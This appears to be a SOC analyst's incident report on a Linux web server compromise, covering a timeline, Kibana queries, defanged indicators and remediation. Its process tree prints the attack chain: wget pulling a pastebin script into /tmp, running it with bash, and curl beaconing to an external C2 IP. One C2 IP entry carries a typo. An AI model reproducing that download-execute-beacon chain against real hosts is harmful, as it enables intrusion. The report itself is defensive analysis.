# [INCIDENT / HANDOVER REPORT]

* **Ticket ID:** INC2023-ITSY-BITSY

* **Incident Status:** Resolved

* **Verdict:** True Positive

* **Incident Severity:** SEV 3 (Medium)

* **Assigned SOC Analyst:** Z.Shamim (L1)

* **Analyst Comment**
Analysis of Elastic Stack (Kibana) telemetry identified a successful compromise of a host originating from access to a malicious domain `phpmyadmin.phptestweb[.]com`. The threat actor leveraged this initial connection to download and execute a malicious payload (`hxxp://pastebin[.]com/raw/kd3729`), resulting in an outbound HTTP C2 beacon to an external malicious IP (`104[.]23[.]99[.]190`). Outbound C2 communication was successfully identified and isolated before lateral movement occurred.


# [TECHNICAL ANALYSIS]

* **Target / Affected Asset(s):**
  - Hostnames: `Ubuntu-Server-01`
  - Addresses: `192[.]168[.]1[.]100` (Internal Server Subnet)
  - User Accounts: `www-data`, `system-user`


## Timeline of Events (UTC)

| Time (UTC) | Telemetry | Activity | TTP |
| :--- | :--- | :--- | :--- |
| `2023-03-22 12:10:05` | Elastic / Proxy Logs | User/Server initiated HTTP GET request to malicious domain `phpmyadmin[.]phptestweb[.]com`. | T1566.002 (Spearphishing Link) |
| `2023-03-22 12:12:30` | Elastic / Network Logs | Server downloaded secondary payload via GET request to pastebin service (`hxxps://pastebin[.]com/raw/kd3729`). | T1105 (Ingress Tool Transfer) |
| `2023-03-22 12:15:42` | Elastic / Process Logs | Malicious shell script executed on host, establishing outbound connection. | T1059.004 (Unix Shell Execution) |
| `2023-03-22 12:16:01` | Elastic / Network Logs | Persistent outbound HTTP C2 beaconing established to `1104[.]23[.]99[.]190` on port 80. | T1071.001 (Web Protocols) |


## Query Strings Used (Elastic / Kibana)

The following Lucene and KQL queries were executed in Kibana during log triage:

```kql
# 1. Identify suspicious outbound connections from the internal subnet
source.ip: 192[.]168[.]1[.]100 AND NOT destination.ip: 192[.]168[.]1[.]0/24

# 2. Filter for HTTP GET requests targeting paste services or suspicious domains
event.category: "network" AND http.request.method: "GET" AND (url.domain: "*phptestweb.com" OR url.domain: "*pastebin.com")

# 3. Trace destination IP for C2 beaconing behavior
destination.ip: "104[.]23[.]99[.]190" | sort by @timestamp asc

# 4. Filter process creation events associated with downloaders (curl/wget)
process.name: ("curl" OR "wget" OR "bash") AND process.args: "*pastebin.com*"
```

## Indicators of Compromise (IOCs)

### Network Indicators
| Indicator | Type | Details |
| :--- | :--- | :--- | :--- |
| `104[.]23[.]99[.]190` | IPv4 | Command & Control (C2) Server IP |
| `phpmyadmin.phptestweb[.]com` | Domain | Phishing / Malicious Initial Entry Domain |
| `hxxps://pastebin[.]com/raw/kd3729` | URL | Staging URL for secondary malicious payload |

### System Indicators
| Indicator | Type | Details |
| :--- | :--- | :--- |
| `kd3729.sh` | Shell Script | Malicious payload executed on the Linux host |
| `curl` / `wget` execution | Command | Native tools abused to pull external payloads |


### Process Tree / Execution Lineage
```text
[apache2] / [nginx] (PID: 1104)
  └── [sh] / [bash] (PID: 2410)
        ├── [wget] pastebin[.]com/raw/kd3729 -O /tmp/kd3729.sh
        └── [bash] /tmp/kd3729.sh
              └── [curl] hxxp://104[.]23[.]99[.]190 beacon (PID: 2488) -> Active C2 Connection
```


**TL;DR:** Phishing Link -> Malicious Script Download (Pastebin) -> Outbound C2 Beaconing (`104[.]23[.]99[.]190`). Threat contained prior to internal spreading or privilege escalation.

## Possible Remediation Steps

- Block `104[.]23[.]99[.]190` and `*.phptestweb.com` at the perimeter firewall and proxy/DNS resolvers.
- Terminate malicious background processes and remove `/tmp/kd3729.sh` from `Ubuntu-Server-01`.
- Implement egress filtering to restrict unauthorized outbound HTTP/HTTPS connections from internal web servers.
- Restrict web server execution permissions to prevent shell interpreters (`bash`, `sh`) from calling external utilities (`curl`, `wget`).
- Update SIEM detection rules to alert on web server processes initiating external connections to paste sites or raw code repositories.
